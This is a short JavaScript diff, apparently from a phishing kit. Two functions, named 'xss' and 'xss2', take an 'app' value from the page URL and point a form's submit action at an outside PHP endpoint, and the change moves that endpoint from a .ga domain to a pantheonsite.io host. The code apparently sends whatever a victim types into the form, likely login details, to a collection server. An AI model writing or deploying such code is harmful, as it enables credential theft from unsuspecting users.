@@ -1,14 +1,14 @@
 function xss(){
 const urlParams = new URLSearchParams(window.location.search);
 const myParam = urlParams.get('app');
-document.getElementById('asset').action = "https://connect.landscore.ga/dolsten/"+myParam+"/DEFAULT.php"
+document.getElementById('asset').action = "https://dev-pitgurat.pantheonsite.io/"+myParam+"/DEFAULT.php"
     
 }
 
 function xss2(){
 const urlParams = new URLSearchParams(window.location.search);
 const myParam = urlParams.get('app');
-document.getElementById('asset').action = "https://connect.landscore.ga/dolsten/"+myParam+"/DEFAULT_2.php"
+document.getElementById('asset').action = "https://dev-pitgurat.pantheonsite.io/"+myParam+"/DEFAULT_2.php"
 }
 
 $(function(){
